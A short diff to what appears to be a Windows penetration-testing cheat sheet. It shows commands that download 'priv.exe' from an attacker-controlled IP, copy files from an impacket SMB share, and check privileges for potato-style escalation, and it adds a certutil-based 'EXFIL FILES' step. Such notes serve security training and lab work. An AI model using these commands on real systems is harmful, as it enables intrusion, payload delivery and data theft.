@@ -75,6 +75,10 @@ $client = New-Object System.Net.WebClient  # two steps is better
 $client.DownloadFile('http://10.10.14.12/priv.exe', '1.exe')
 xcopy \\10.10.14.7\files\taskkill.exe  # from smb file server created with impacket
 
+
+EXFIL FILES CMD/PS
+certutil -encode PATH DESTINATION
+
 PRIVESC WINDOWS 
 whoami /priv
 # if SeImpersonatePrivilege is enabled --> juicy/rotten potato
